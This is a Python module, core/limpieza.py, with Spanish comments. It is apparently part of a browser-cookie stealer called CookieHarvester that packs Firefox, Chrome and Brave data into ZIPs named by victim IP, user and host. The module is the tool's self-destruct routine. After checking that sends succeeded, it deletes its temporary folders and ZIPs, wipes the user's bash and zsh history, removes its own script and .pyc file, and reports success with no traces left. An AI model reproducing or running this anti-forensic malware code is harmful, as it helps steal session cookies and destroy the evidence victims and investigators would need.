#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
core/limpieza.py
- Autodestrucción segura: elimina temporales, ZIPs, historial y script.
- Solo se ejecuta si AUTODESTRUIR es True.
- Verifica envíos antes de borrar.
"""

import os
import sys
import time
import glob
import shutil
import socket
import getpass
import traceback

from config import REQUESTS_DISPONIBLE

# Importamos requests solo si está disponible.
if REQUESTS_DISPONIBLE:
    import requests


def es_zip_seguro_eliminar(zip_path):
    """
    Verifica que el ZIP sea de CookieHarvester antes de eliminarlo.
    """
    nombre = os.path.basename(zip_path)
    if any(keyword in nombre for keyword in ['Firefox', 'Chrome', 'Brave', 'c4_']):
        return True
    return False


def autodestruir_seguro(temp_dir, script_path, mensajes_enviados):
    """
    Elimina el script y archivos temporales SOLO después de confirmar envíos.
    Muestra el proceso de autodestrucción.
    """
    try:
        print("\n[DEBUG] === AUTODESTRUIR_SEGURO ===")
        print(f"[DEBUG] temp_dir: {temp_dir}")
        print(f"[DEBUG] script_path: {script_path}")

        print("\n[*] Verificando envíos antes de autodestruir...")
        todos_exitosos = all(mensajes_enviados.values())

        if not todos_exitosos:
            print("[!] Algunos mensajes no se enviaron correctamente:")
            for nombre, estado in mensajes_enviados.items():
                print(f"    - {nombre}: {'Enviado' if estado else 'Falló'}")
            print("[*] Esperando 10 segundos antes de autodestruir...")
            time.sleep(10)

        print("[*] Iniciando autodestrucción...")

        # 1. Eliminar SOLO los directorios temporales de CookieHarvester
        c4_dirs = glob.glob('/tmp/c4_*')
        if c4_dirs:
            print(f"[*] Eliminando {len(c4_dirs)} directorios temporales...")
            for c4_dir in c4_dirs:
                if os.path.exists(c4_dir):
                    shutil.rmtree(c4_dir, ignore_errors=True)
                    print(f"[+] Eliminado: {c4_dir}")
        else:
            print("[*] No hay directorios c4_* para eliminar")

        # 2. Eliminar SOLO los ZIP que coinciden con el patrón de CookieHarvester.
        try:
            ip = requests.get('https://api.ipify.org', timeout=3).text.replace('.', '_')
        except Exception:
            ip = "unknown"
        usuario = getpass.getuser()
        equipo = socket.gethostname()

        patron_zip = f"/tmp/{ip}_*_{usuario}_*_{equipo}_*.zip"
        zips_cookie = glob.glob(patron_zip)

        if zips_cookie:
            print(f"[*] Eliminando {len(zips_cookie)} archivos ZIP de CookieHarvester...")
            for zip_file in zips_cookie:
                if os.path.exists(zip_file):
                    os.remove(zip_file)
                    print(f"[+] Eliminado ZIP: {zip_file}")
        else:
            print("[*] No hay ZIPs de CookieHarvester para eliminar")

        # También eliminar archivos part* que puedan haber quedado.
        patron_parts = f"/tmp/{ip}_*_{usuario}_*_{equipo}_*_part*.zip"
        parts_cookie = glob.glob(patron_parts)
        for part_file in parts_cookie:
            if os.path.exists(part_file):
                os.remove(part_file)
                print(f"[+] Eliminado parte: {part_file}")

        # 3. Limpiar historial de bash
        print("[*] Limpiando historial de comandos...")
        os.system('history -c 2>/dev/null')
        os.system('history -w 2>/dev/null')
        os.system('cat /dev/null > ~/.bash_history 2>/dev/null')
        if os.path.exists(os.path.expanduser('~/.zsh_history')):
            os.system('cat /dev/null > ~/.zsh_history 2>/dev/null')

        # 4. Eliminar el script
        time.sleep(1)
        if os.path.exists(script_path):
            os.remove(script_path)
            print(f"[+] Eliminado script: {script_path}")

        # 5. Eliminar archivos .pyc
        pyc_file = f"{script_path}c"
        if os.path.exists(pyc_file):
            os.remove(pyc_file)
            print(f"[+] Eliminado: {pyc_file}")

        # 6. Eliminar también el directorio temp actual (por si acaso)
        if temp_dir and temp_dir != script_path and os.path.exists(temp_dir):
            shutil.rmtree(temp_dir, ignore_errors=True)
            print(f"[+] Eliminado directorio temp: {temp_dir}")

        print("[+] 🧹 Autodestrucción completada - SIN RASTROS")
        sys.exit(0)

    except Exception as e:
        print(f"[!] Error en autodestrucción: {e}")
        traceback.print_exc()
        sys.exit(1)